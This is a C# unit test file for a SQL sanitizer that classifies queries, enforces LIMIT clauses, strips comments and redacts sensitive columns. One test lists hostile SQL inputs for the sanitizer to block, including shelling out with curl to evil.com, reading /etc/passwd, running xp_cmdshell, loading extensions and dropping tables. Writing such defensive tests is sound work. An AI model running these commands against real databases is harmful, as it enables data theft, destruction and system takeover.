using Gram.Blazor.Shared;
using Xunit;

namespace Gram.Blazor.UnitTests;

public sealed class SafeSqlSanitizerTests
{
    [Fact]
    public void AllowsSafeSelectQueryAndInjectsLimit()
    {
        var sql = "SELECT id, name FROM users;";
        var result = SafeSqlSanitizer.ClassifyAndSanitize(sql, DatabaseEngine.Sqlite);

        Assert.Null(result.Error);
        Assert.Equal(SqlStatementType.Select, result.Type);
        Assert.True(result.IsReadOnly);
        Assert.False(result.IsMutating);
        Assert.Contains("LIMIT 100", result.SanitizedSql);
    }

    [Fact]
    public void PreservesExistingLimitWithinMax()
    {
        var sql = "SELECT id FROM items LIMIT 25;";
        var result = SafeSqlSanitizer.ClassifyAndSanitize(sql, DatabaseEngine.Postgres);

        Assert.Null(result.Error);
        Assert.Equal(SqlStatementType.Select, result.Type);
        Assert.True(result.IsReadOnly);
        Assert.Contains("LIMIT 25", result.SanitizedSql);
        Assert.DoesNotContain("LIMIT 100", result.SanitizedSql);
    }

    [Fact]
    public void ClampsExcessiveLimitToMaxLimit()
    {
        var sql = "SELECT id FROM items LIMIT 5000;";
        var result = SafeSqlSanitizer.ClassifyAndSanitize(sql, DatabaseEngine.Postgres, defaultLimit: 100, maxLimit: 1000);

        Assert.Null(result.Error);
        Assert.Contains("LIMIT 1000", result.SanitizedSql);
        Assert.DoesNotContain("LIMIT 5000", result.SanitizedSql);
    }

    [Fact]
    public void PermitsSemicolonInsideStringLiteral()
    {
        var sql = "SELECT 'hello; world' AS greeting FROM dual;";
        var result = SafeSqlSanitizer.ClassifyAndSanitize(sql, DatabaseEngine.Postgres);

        Assert.Null(result.Error);
        Assert.Equal(SqlStatementType.Select, result.Type);
        Assert.True(result.IsReadOnly);
    }

    [Fact]
    public void BlocksStackedMultiStatementQuery()
    {
        var sql = "SELECT 1; DROP TABLE users;";
        var result = SafeSqlSanitizer.ClassifyAndSanitize(sql, DatabaseEngine.Sqlite);

        Assert.NotNull(result.Error);
        Assert.Equal(SqlStatementType.Prohibited, result.Type);
        Assert.Contains("Multi-statement", result.Error);
    }

    [Theory]
    [InlineData("ATTACH DATABASE '/tmp/pwn.db' AS pwn;")]
    [InlineData("DETACH DATABASE pwn;")]
    [InlineData("SELECT load_extension('/lib/evil.so');")]
    [InlineData("PRAGMA writable_schema = 1;")]
    [InlineData("COPY users TO PROGRAM 'curl evil.com';")]
    [InlineData("SELECT pg_read_file('/etc/passwd');")]
    [InlineData("SELECT pg_terminate_backend(123);")]
    [InlineData("ALTER SYSTEM SET log_statement = 'all';")]
    [InlineData("CREATE EXTENSION evil;")]
    [InlineData("GRANT ALL PRIVILEGES ON DATABASE test TO evil;")]
    [InlineData("EXEC xp_cmdshell 'whoami';")]
    public void BlocksProhibitedCommands(string prohibitedSql)
    {
        var result = SafeSqlSanitizer.ClassifyAndSanitize(prohibitedSql, DatabaseEngine.Sqlite);

        Assert.NotNull(result.Error);
        Assert.Equal(SqlStatementType.Prohibited, result.Type);
    }

    [Fact]
    public void StripsCommentsSafely()
    {
        var sql = """
            -- Fetch all active members
            SELECT id, email -- inline comment
            /* multi
               line
               comment */
            FROM members;
            """;
        var result = SafeSqlSanitizer.ClassifyAndSanitize(sql, DatabaseEngine.Postgres);

        Assert.Null(result.Error);
        Assert.Equal(SqlStatementType.Select, result.Type);
        Assert.DoesNotContain("Fetch all active members", result.SanitizedSql);
        Assert.DoesNotContain("inline comment", result.SanitizedSql);
        Assert.DoesNotContain("multi", result.SanitizedSql);
    }

    [Fact]
    public void CorrectlyClassifiesMutatingStatements()
    {
        var insert = SafeSqlSanitizer.ClassifyAndSanitize("INSERT INTO users (name) VALUES ('Alice');", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.Insert, insert.Type);
        Assert.True(insert.IsMutating);
        Assert.False(insert.IsReadOnly);

        var update = SafeSqlSanitizer.ClassifyAndSanitize("UPDATE users SET name = 'Bob' WHERE id = 1;", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.Update, update.Type);
        Assert.True(update.IsMutating);

        var delete = SafeSqlSanitizer.ClassifyAndSanitize("DELETE FROM users WHERE id = 1;", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.Delete, delete.Type);
        Assert.True(delete.IsMutating);

        var create = SafeSqlSanitizer.ClassifyAndSanitize("CREATE TABLE logs (id INT PRIMARY KEY);", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.Create, create.Type);
        Assert.True(create.IsMutating);

        var drop = SafeSqlSanitizer.ClassifyAndSanitize("DROP TABLE temp_logs;", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.Drop, drop.Type);
        Assert.True(drop.IsMutating);
    }

    [Fact]
    public void AllowsSafeSqlitePragmas()
    {
        var info = SafeSqlSanitizer.ClassifyAndSanitize("PRAGMA table_info('users');", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.PragmaRead, info.Type);
        Assert.True(info.IsReadOnly);
        Assert.False(info.IsMutating);

        var indexes = SafeSqlSanitizer.ClassifyAndSanitize("PRAGMA index_list('users');", DatabaseEngine.Sqlite);
        Assert.Equal(SqlStatementType.PragmaRead, indexes.Type);
        Assert.True(indexes.IsReadOnly);
    }

    [Fact]
    public void HandlesCteQueriesCorrectly()
    {
        var cte = """
            WITH regional_sales AS (
                SELECT region, SUM(amount) AS total_sales
                FROM orders
                GROUP BY region
            )
            SELECT * FROM regional_sales;
            """;
        var result = SafeSqlSanitizer.ClassifyAndSanitize(cte, DatabaseEngine.Postgres);

        Assert.Null(result.Error);
        Assert.Equal(SqlStatementType.Select, result.Type);
        Assert.True(result.IsReadOnly);
        Assert.Contains("LIMIT 100", result.SanitizedSql);
    }

    [Fact]
    public void RedactsSensitiveColumnsInDataRows()
    {
        var columns = new[] { "id", "username", "password_hash", "api_key", "email" };
        var rows = new List<IReadOnlyDictionary<string, object?>>
        {
            new Dictionary<string, object?>
            {
                ["id"] = 1,
                ["username"] = "admin",
                ["password_hash"] = "$2a$12$e8r...",
                ["api_key"] = "sk-live-12345",
                ["email"] = "admin@example.com"
            }
        };

        var redacted = SafeSqlSanitizer.RedactSensitiveRows(columns, rows);

        Assert.Single(redacted);
        Assert.Equal(1, redacted[0]["id"]);
        Assert.Equal("admin", redacted[0]["username"]);
        Assert.Equal("[REDACTED]", redacted[0]["password_hash"]);
        Assert.Equal("[REDACTED]", redacted[0]["api_key"]);
        Assert.Equal("admin@example.com", redacted[0]["email"]);
    }
}
